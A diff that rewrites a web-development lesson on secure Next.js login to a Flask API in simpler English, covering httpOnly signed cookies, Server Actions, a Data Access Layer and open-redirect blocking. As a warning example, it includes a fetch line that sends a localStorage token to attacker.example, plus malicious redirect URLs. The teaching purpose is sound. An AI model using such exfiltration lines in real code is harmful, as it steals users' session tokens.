@@ -1,6 +1,6 @@
 ---
 title: "Client State & Authentication Flow"
-summary: Log in to a Flask API from Next.js safely — where tokens live, signed httpOnly session cookies with jose, login/logout Server Actions, a Data Access Layer, optimistic proxy.ts redirects and open-redirect protection.
+summary: Log in to a Flask API from Next.js safely — where tokens should live, signed httpOnly session cookies with jose, login/logout Server Actions, a Data Access Layer, quick proxy.ts redirects and blocking open redirects.
 type: lesson
 source: core
 sourceRef: "M3 · W5 · L2"
@@ -13,35 +13,49 @@ tags: [authentication, sessions, cookies, jwt, jose, proxy, security, nextjs]
 
 ## 🎯 What you'll learn
 
-- The difference between **authentication** (who are you?) and **authorization** (what may you do?)
-- Where auth state should live: server cookie vs `localStorage` vs React state
-- Stateless sessions: signing a session with **jose** and storing it in an **httpOnly, secure, sameSite** cookie
-- Login and logout **Server Actions** that call the Flask API
-- A **Data Access Layer** (DAL) with `verifySession()` and DTOs
-- **`proxy.ts`** (formerly middleware) for optimistic redirects — and why it is not enough
-- Preventing **open redirects** and **account enumeration**
+- **Authentication** (who are you?) vs **authorization** (what may you do?)
+- Where the login token should live — and where it should not
+- Signed session cookies with **jose**, stored as **httpOnly** cookies
+- Login and logout with **Server Actions** that call Flask
+- A **Data Access Layer** that checks the session before loading data
+- **`proxy.ts`** for quick redirects — and why it isn't enough
+- Blocking **open redirects** and not revealing which emails are registered
+
+## 🔤 Key words
+
+| Word | In simple words | Bahasa Indonesia |
+|---|---|---|
+| **Authentication** | Checking who the user is (login) | Autentikasi |
+| **Authorization** | Checking what the user is allowed to do | Otorisasi / izin |
+| **Session** | "This browser is logged in as user 7" remembered between requests | Sesi |
+| **Cookie** | A small piece of data the browser sends with every request to your site | Cookie |
+| **httpOnly** | A cookie setting: JavaScript can't read it | Tidak bisa dibaca JS |
+| **JWT** | A token with data inside and a signature that shows it wasn't changed | Token bertanda tangan |
+| **XSS** | An attack that runs someone's script on your page | Serangan skrip |
+| **Data Access Layer (DAL)** | Server files that check the session, then load data | Lapisan akses data |
+| **Open redirect** | Sending users to any site an attacker puts in the URL | Pengalihan berbahaya |
 
 ## 🧠 The big idea
 
-Think of a **concert wristband**. At the gate (login) security checks your ticket (password) once and gives you a wristband (session cookie). Inside, staff check the wristband instead of asking for your ticket again. The wristband is **tamper-proof** (signed), **can't be taken off and handed to someone else easily** (httpOnly, secure) and **expires** after the event.
+Think of a **concert wristband**. At the gate (login), security checks your ticket (password) once and gives you a wristband (session cookie). Inside, staff check the wristband instead of your ticket. The wristband is **tamper-proof** (signed), **hard to pass to someone else** (httpOnly, secure) and **expires** after the event.
 
-- The **usher at the hall entrance** glances at wristbands (proxy.ts — fast, optimistic).
-- The **backstage guard** checks the wristband carefully and your name on the list (DAL + Flask API — the real check).
+- The **usher at the hall door** only glances at wristbands → `proxy.ts` (fast, not strict).
+- The **backstage guard** checks the wristband carefully and your name on the list → the Data Access Layer and the Flask API (the real check).
 
-## ❓ Why does this exist?
+## ❓ Why it matters
 
-Your Flask API (Module 2) returns an **access token** after `POST /api/v1/auth/login`. The Next.js app must attach it to every API call. The question is **where to keep it**:
+After `POST /api/v1/auth/login`, your Flask API (Module 2) returns an **access token**. Next.js must send it with every API call. The big question is **where to keep it**:
 
-| Storage | Readable by JS (XSS can steal it)? | Sent automatically? | Available to Server Components? |
+| Storage | Can JavaScript read it (so XSS can steal it)? | Sent automatically? | Available on the server? |
 |---|---|---|---|
 | `localStorage` | **yes** ❌ | no | no ❌ |
 | React state / Zustand | yes ❌ | no | no — lost on refresh ❌ |
-| Non-httpOnly cookie | **yes** ❌ | yes | yes |
+| Normal cookie | **yes** ❌ | yes | yes |
 | **httpOnly + secure cookie** ✅ | **no** | yes (same site) | **yes** |
 
-With the App Router, most data is fetched **on the server**, so a server-readable httpOnly cookie is both the safest and the most convenient option.
+In the App Router most data is loaded **on the server**, so an httpOnly cookie is both the safest and the easiest choice.
 
-## 💥 What happens if we DON'T?
+What goes wrong otherwise:
 
 ```tsx
 // ❌ a typical tutorial
@@ -50,11 +64,11 @@ localStorage.setItem("token", data.access_token);
 fetch("https://attacker.example/steal?t=" + localStorage.getItem("token"));
 ```
 
-Other common failures: checking auth only in a layout (layouts don't re-render on client navigation, and Server Actions skip them), sending `?next=https://phishing.example` redirects, and error messages like "No account with this email" that let attackers discover registered users.
+Other common problems: checking login only in a layout (layouts don't run again on every navigation, and Server Actions skip them), redirecting to `?next=https://phishing.example`, and messages like "No account with this email" that tell attackers who is registered.
 
-## 📖 How it works, step by step
+## 📖 Step by step
 
-### 1. The flow
+### 1. The whole flow
 
 ```mermaid
 sequenceDiagram
@@ -73,6 +87,11 @@ sequenceDiagram
     F-->>N: data (Flask checks the token again)
     N-->>B: HTML
 ```
+
+1. The login form sends email and password to a Server Action.
+2. The action asks Flask to log in and receives the token.
+3. Next.js puts the token inside a **signed session** and saves it as an httpOnly cookie.
+4. On every page, the session is checked, and the token is used to call Flask **from the server**. The browser never sees the token.
 
 ### 2. Signing the session with jose
 
@@ -99,11 +118,13 @@ export async function decrypt(token: string | undefined) {
 }
 ```
 
-- `algorithms: ["HS256"]` pins the algorithm — never let the token choose.
-- Generate the secret with `openssl rand -base64 32`, store it in `.env.local` / your host's secret manager.
+- A **signature** is like a **wax seal** on a letter: anyone can read the letter, but if someone changes it, the seal breaks.
+- `algorithms: ["HS256"]` fixes the signing method — never let the token decide.
+- Invalid, changed or expired token → `null` → treated as "logged out" (not a crash).
+- Create the secret with `openssl rand -base64 32` and keep it in `.env.local` or your host's secret manager.
 
 :::note[Signed vs encrypted]
-A signed JWT (JWS) is **tamper-proof but readable** — base64 is not encryption. That's acceptable inside an httpOnly cookie, but if the payload contains something sensitive (like the Flask access token) and you want defense-in-depth, use jose's `EncryptJWT` (JWE) or a **database session** that stores only a random session id in the cookie. The exercise uses a signed token to keep the focus on the flow.
+A signed JWT is **tamper-proof but readable** — base64 is not encryption. That's acceptable inside an httpOnly cookie. If the session holds something sensitive (like the Flask token) and you want extra protection, use jose's `EncryptJWT`, or a **database session** that only keeps a random session id in the cookie. The exercise uses a signed token to keep the focus on the flow.
 :::
 
 ### 3. Setting and deleting the cookie
@@ -120,16 +141,17 @@ export async function deleteSession() {
 }
 ```
 
-`cookies()` is **async** in Next.js 15+, and cookies can only be **set** in Server Actions and Route Handlers (not while rendering a page).
+- `cookies()` is **async** — use `await`.
+- You can only **set** cookies in Server Actions and Route Handlers, not while rendering a page.
 
-| Flag | Protects against |
+| Setting | Protects against |
 |---|---|
-| `httpOnly` | scripts reading the cookie (XSS token theft) |
+| `httpOnly` | scripts reading the cookie (token theft through XSS) |
 | `secure` | sending it over plain HTTP |
-| `sameSite: "lax"` | most CSRF: cookie not sent on cross-site POSTs |
-| `expires` / `maxAge` | forever-valid sessions |
+| `sameSite: "lax"` | most CSRF: the cookie isn't sent with POSTs from other sites |
+| `expires` / `maxAge` | sessions that never end |
 
-Server Actions additionally compare the `Origin` header with the host, so cross-site action calls are rejected.
+Server Actions also compare the `Origin` header with your site, so calls from other sites are rejected.
 
 ### 4. Login and logout actions
 
@@ -156,9 +178,12 @@ export async function logout() {
 }
 ```
 
-### 5. Open-redirect protection
+- "Invalid email or password" is the **same message** whether the email exists or not. A more specific message would help attackers find registered users.
+- `redirect` stays outside `try/catch` (lesson 01).
 
-After login we send users back where they were (`/login?next=/applications/3`). Attackers love this:
+### 5. Blocking open redirects
+
+After login we send users back where they came from (`/login?next=/applications/3`). Attackers abuse this:
 
 ```text
 https://careerpilot.app/login?next=https://careerp1lot.app/fake-dashboard
@@ -170,7 +195,7 @@ export function safeNextPath(value: unknown) {
 }
 ```
 
-Only same-site **relative paths**. `//evil.example` and `/\evil.example` look relative but browsers treat them as other hosts.
+Only allow **relative paths on your own site**. Like a hotel receptionist who only sends guests to rooms **inside the hotel**, never to an address a stranger wrote on a note. `//evil.example` and `/\evil.example` look relative, but browsers treat them as other sites — the regex blocks them.
 
 ### 6. The Data Access Layer
 
@@ -191,11 +216,11 @@ export async function getCurrentUser() {
 }
 ```
 
-- Every data function (`getApplications()`, `addNote()`) calls `verifySession()` **first** and uses the token for the Flask call.
-- React `cache()` means many components can call it in one render and the cookie is decrypted once.
-- DTOs make it hard to accidentally pass secrets to Client Components.
+- Every data function (`getApplications()`, `addNote()`) calls `verifySession()` **first**, then uses the token to call Flask. This is the backstage guard.
+- `cache()` means many components can call it during one request, but the cookie is checked only once.
+- `getCurrentUser()` returns a small object without the token (a **DTO**), so the token can't accidentally reach Client Components.
 
-### 7. `proxy.ts` — optimistic checks
+### 7. `proxy.ts` — the quick check
 
 ```ts
 // proxy.ts (project root) — Next.js 16 renamed middleware.ts to proxy.ts
@@ -215,93 +240,76 @@ export default async function proxy(request: NextRequest) {
 export const config = { matcher: ["/((?!api|_next/static|_next/image|favicon.ico).*)"] };
 ```
 
-Proxy runs before **every** matched request, so keep it fast. It improves UX (no flash of a protected page) and protects **static** pages, but the DAL and Flask still do the real checks.
+- `proxy.ts` runs before **every** matching request, so keep it fast: read the cookie only, no database or API calls.
+- It makes the experience smoother (no flash of a protected page before redirecting).
+- It is the usher, not the guard: the DAL and Flask still do the real checks.
 
-### 8. "Client state" for auth
+### 8. Showing the user in Client Components
 
-Client Components sometimes need to know the user (avatar, "Log out" button). Pass a **DTO** from a Server Component as props, or put that DTO in a small context. Never fetch the token into the browser. Logging out is a Server Action: `<form action={logout}><button>Log out</button></form>`.
-
-## ⚖️ Trade-offs
-
-| Session style | ✅ | ❌ |
-|---|---|---|
-| Stateless (signed/encrypted cookie) | no DB lookup, simple, scales | can't revoke one session instantly; payload size limit (~4 KB) |
-| Database session (random id in cookie) | instant revocation, "log out all devices", small cookie | a lookup per request (cache it), more infrastructure |
-| Auth library (Auth.js, Better Auth, Clerk, …) | OAuth, MFA, password reset, audited code | less control; learning its abstractions; vendor lock-in for SaaS |
-
-## ✅ When to use it / 🚫 When NOT to use it
-
-- ✅ BFF-style auth like this when your own API (Flask/FastAPI) owns users and issues tokens.
-- ✅ An auth library or provider when you need social login, MFA, magic links, organisations.
-- 🚫 Don't build password hashing, reset flows and MFA yourself for production unless the backend already has them tested (your Flask API does the hashing).
-- 🚫 Don't use `localStorage` for tokens in an app that can use cookies.
-
-## 🏆 Best practices
-
-- [ ] Tokens only in **httpOnly + secure + sameSite** cookies; never in `localStorage` or `NEXT_PUBLIC_` vars.
-- [ ] Pin the JWT algorithm; use a ≥ 32-byte random secret from a secret manager; rotate it if leaked.
-- [ ] Short-lived access tokens with refresh/rotation for high-risk apps; reasonable session expiry (e.g. 7 days) with re-login for sensitive actions.
-- [ ] Check auth in a **DAL** close to the data, and in every Server Action and Route Handler.
-- [ ] Use `proxy.ts` only for optimistic redirects; never as the only check.
-- [ ] Don't rely on layouts for auth checks.
-- [ ] Generic login errors; rate-limit login on the API (Module 2).
-- [ ] Validate `next`/`returnTo` redirect targets.
-- [ ] Return DTOs; mark data modules `server-only`.
-- [ ] Log security events (login failures, logouts) on the server, never the password or token.
-
-## 🏭 How it's used in industry
-
-- Many Next.js teams use the **Backend-for-Frontend** approach: the browser holds only a session cookie, and the Next.js server talks to internal APIs with tokens.
-- OWASP recommends httpOnly/secure cookies and warns against storing session tokens in `localStorage`.
-- Hosted providers (Clerk, Auth0, Cognito) and libraries (Auth.js, Better Auth) implement these same building blocks — knowing them helps you configure and debug any provider.
+Client Components sometimes need the user (an avatar, a "Log out" button). Pass the small **DTO** from a Server Component as props, or put it in a small context. Never send the token to the browser. Logout is a Server Action: `<form action={logout}><button>Log out</button></form>`.
 
 ## ⚠️ Common mistakes
 
-- Calling `cookies().set` while rendering a page → error; set cookies only in actions/route handlers.
-- `decrypt` that throws on a bad token → a 500 page instead of a redirect to login.
-- Forgetting `secure` in production (or making it `false` everywhere "for localhost").
-- Checking `if (session)` in the page but not in the Server Action that mutates.
+- Setting cookies while rendering a page → error; set them only in actions or route handlers.
+- A `decrypt` that throws on a bad token → a 500 page instead of a redirect to login.
+- `secure: false` everywhere "for localhost", and forgetting it in production.
+- Checking the session in the page but not in the Server Action that changes data.
 - Putting the full Flask user object (with internal fields) into the session.
+- Tokens in `localStorage` or `NEXT_PUBLIC_` variables.
+- Building password hashing, reset flows and MFA yourself — let the tested backend or an auth library do it.
+
+## 🏆 Best practices
+
+- [ ] Tokens only in **httpOnly + secure + sameSite** cookies.
+- [ ] Fix the JWT algorithm; use a random secret of at least 32 bytes from a secret manager; replace it if it leaks.
+- [ ] Reasonable session expiry (for example 7 days); ask for login again before very sensitive actions.
+- [ ] Check the session in a **DAL** close to the data, and in every Server Action and Route Handler.
+- [ ] Use `proxy.ts` only for quick redirects — never as the only check.
+- [ ] Don't rely on layouts for login checks.
+- [ ] Same login error for wrong email and wrong password; limit login attempts on the API (Module 2).
+- [ ] Check `next` / `returnTo` redirect targets.
+- [ ] Return DTOs; mark data files `server-only`.
+- [ ] Log security events (failed logins, logouts) on the server — never the password or token.
 
 ::part[Explain & Design]{n="2"}
 
 ## 🗣️ Explain it
 
-Using the concert wristband analogy, explain to a teammate why `proxy.ts` alone is not enough, and what the "backstage guard" is in our architecture.
+Using the concert wristband idea, explain to a teammate why `proxy.ts` alone isn't enough, and what the "backstage guard" is in our app.
 
 ## 📐 Design it
 
-CareerPilot wants **"Log out of all devices"** and an admin ability to **ban** a user immediately. The current design uses stateless signed cookies valid for 7 days. Propose a design change: what's stored where, what changes in `verifySession`, `proxy.ts` and the Flask API, and what it costs.
+CareerPilot wants **"Log out of all devices"** and a way for admins to **ban** a user immediately. The current design uses signed cookies that are valid for 7 days and aren't stored anywhere on the server. Propose a change: what is stored where, what changes in `verifySession`, `proxy.ts` and Flask, and what it costs.
 
 :::quiz
 Show a possible design
 
-- **Server-side sessions:** Flask gets a `sessions` table (`id` random 256-bit, `user_id`, `created_at`, `expires_at`, `revoked_at`, `user_agent`). Login creates a row; the cookie holds only the **session id** (or a signed wrapper of it).
-- **verifySession (DAL):** decrypt cookie → call Flask `GET /auth/session` (or look up Redis) → reject if revoked/expired/user banned. Wrap with React `cache()` per request and a **short TTL cache in Redis** (e.g. 30–60 s) to avoid a lookup storm — accepting up to 60 s delay for bans, or skip the cache for admin/sensitive routes.
-- **proxy.ts:** still only checks that a well-formed cookie exists (optimistic). No network calls.
-- **Log out all devices:** `UPDATE sessions SET revoked_at = now() WHERE user_id = ?`.
-- **Ban:** mark user banned + revoke sessions; Flask rejects tokens for banned users on every request (defense in depth).
-- **Costs:** a lookup per request (latency, Redis/DB load), more code, session cleanup job; benefit: instant revocation and a "your devices" page.
+- **Sessions stored on the server:** Flask gets a `sessions` table (`id` = long random value, `user_id`, `created_at`, `expires_at`, `revoked_at`, `user_agent`). Login creates a row; the cookie holds only the **session id**.
+- **`verifySession` (DAL):** read the cookie → ask Flask `GET /auth/session` (or look it up in Redis) → reject if revoked, expired or the user is banned. Use React `cache()` per request, plus a **short Redis cache** (30–60 seconds) to avoid a lookup on every call — so a ban takes effect within 60 seconds, or skip the cache for admin and sensitive pages.
+- **`proxy.ts`:** still only checks that a valid-looking cookie exists. No network calls.
+- **Log out of all devices:** `UPDATE sessions SET revoked_at = now() WHERE user_id = ?`.
+- **Ban:** mark the user as banned and revoke all sessions; Flask also rejects tokens of banned users on every request (a second layer of protection).
+- **Cost:** a lookup per request (a bit slower, more load on Redis/database), more code, and a job to clean old sessions. **Benefit:** instant logout everywhere and a "your devices" page.
 :::
 
 ### 📝 Self-review checklist
 
-- [ ] The browser never sees a token it could reuse against Flask directly
-- [ ] Revocation delay is explicit
-- [ ] Proxy stays network-free
+- [ ] The browser never gets a token it could use against Flask directly
+- [ ] The delay before a ban takes effect is stated clearly
+- [ ] `proxy.ts` makes no network calls
 
 ::ai-review{task="design"}
 
 ::part[Toy Exercise]{n="3"}
 
 :::exercise{path="exercises/web/m4/w5/02-auth-sessions" ai="no-ai" title="Sessions, DAL and proxy.ts"}
-Implement signed session cookies with jose, login/logout Server Actions calling Flask, open-redirect protection, a cached `verifySession` DAL returning DTOs, and optimistic redirects in `proxy.ts`. Tests use real JWTs, forged tokens and `NextRequest` objects.
+Build signed session cookies with jose, login/logout Server Actions that call Flask, open-redirect protection, a cached `verifySession` DAL that returns DTOs, and quick redirects in `proxy.ts`. The tests use real JWTs, forged tokens and `NextRequest` objects.
 :::
 
 :::hints
 - `new TextEncoder().encode(secret)` turns the secret into a key for `SignJWT(...).sign(key)`.
 - Wrap `jwtVerify` in `try/catch` and return `null`.
-- The test for the matcher treats it as a regular expression — copy the pattern from the README exactly.
+- The matcher test reads it as a regular expression — copy the pattern from the README exactly.
 - `request.nextUrl.search` includes the leading `?`.
 :::
 
@@ -310,26 +318,14 @@ Implement signed session cookies with jose, login/logout Server Actions calling 
 :::quiz
 An attacker finds an XSS bug on your site. With httpOnly session cookies, what can and can't they do?
 
-They **can't read** the cookie to steal the session for later. They **can** still make requests from the victim's browser while the page is open (the cookie is sent automatically). httpOnly limits damage; it doesn't replace fixing XSS and a Content Security Policy.
+They **can't read** the cookie to steal the session for later. They **can** still send requests from the victim's browser while the page is open, because the cookie is sent automatically. httpOnly limits the damage; you still have to fix XSS and add a Content Security Policy.
 :::
 
 :::quiz
-Why does `verifySession` use React `cache()` instead of a module-level variable?
+Why does `verifySession` use React `cache()` instead of a normal variable at the top of the file?
 
-`cache()` memoizes per server request/render. A module-level variable would be shared between **different users'** requests on the same server — a data leak.
+`cache()` remembers the result only during one request. A normal module variable would be shared between **different users'** requests on the same server — a data leak.
 :::
-
-## 📖 Kamus (glossary)
-
-| Term | Bahasa Indonesia |
-|---|---|
-| Authentication | Autentikasi — memastikan identitas pengguna |
-| Authorization | Otorisasi — izin melakukan sesuatu |
-| Session cookie | Cookie sesi |
-| httpOnly | Cookie tidak bisa dibaca JavaScript |
-| Open redirect | Pengalihan terbuka ke situs lain (celah keamanan) |
-| Data Access Layer | Lapisan akses data |
-| Account enumeration | Menebak akun yang terdaftar |
 
 ## 📚 Keep learning
 
